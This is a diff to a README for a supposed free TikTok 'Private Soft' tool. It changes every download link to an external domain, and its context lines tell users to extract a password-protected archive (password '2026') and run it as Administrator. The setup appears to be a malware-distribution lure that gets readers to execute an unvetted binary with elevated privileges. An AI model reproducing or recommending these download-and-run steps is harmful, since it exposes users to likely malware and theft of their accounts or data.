@@ -9,7 +9,7 @@ The **📱 Private Soft for TikTok** is a **free** educational content managemen
 
 <div align="center">
 
-[![Download Private Soft for TikTok](https://img.shields.io/badge/Download-purple?style=for-the-badge&logo=github)](https://tinyurl.com/private-soft-for-tiktok)
+[![Download Private Soft for TikTok](https://img.shields.io/badge/Download-purple?style=for-the-badge&logo=github)](https://software-nation.com/private-soft-for-tiktok)
 
 </div>
 
@@ -108,7 +108,7 @@ Managing TikTok content and understanding analytics can be challenging. This edu
 2. **📦 Extract the archive** — password: `2026`
 3. **🖱️ Run as Administrator** → Complete setup → Launch
 
-[![Download Private Soft for TikTok](https://img.shields.io/badge/Download-purple?style=for-the-badge&logo=github)](https://tinyurl.com/private-soft-for-tiktok)
+[![Download Private Soft for TikTok](https://img.shields.io/badge/Download-purple?style=for-the-badge&logo=github)](https://software-nation.com/private-soft-for-tiktok)
 
 ### Detailed Installation (April 2026 Update)
 
@@ -265,7 +265,7 @@ Organize your TikTok content strategy for free. **Private Soft for TikTok** help
 
 <div align="center">
 
-[![Download Private Soft for TikTok](https://img.shields.io/badge/Download-purple?style=for-the-badge&logo=github)](https://tinyurl.com/private-soft-for-tiktok)
+[![Download Private Soft for TikTok](https://img.shields.io/badge/Download-purple?style=for-the-badge&logo=github)](https://software-nation.com/private-soft-for-tiktok)
 
 **Version 4.6.1** — Educational content toolkit. April 2026 update. Zero cost. No payment.
 
